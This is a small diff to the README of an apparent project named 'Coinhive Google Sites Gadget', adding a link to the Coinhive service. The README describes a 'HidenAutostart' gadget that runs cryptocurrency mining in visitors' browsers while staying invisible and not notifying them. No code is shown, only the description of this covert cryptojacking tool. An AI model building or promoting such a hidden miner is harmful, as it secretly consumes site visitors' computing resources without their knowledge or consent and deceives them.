@@ -1,5 +1,5 @@
 # Coinhive Google Sites Gadget
-A Coinhive mining Gadget for Google Sites.
+A [Coinhive](https://coinhive.com/) mining Gadget for Google Sites.
 
 ## HidenAutostart Gadget:
  Not visable on the page and does not notify the client visiting the webpage.
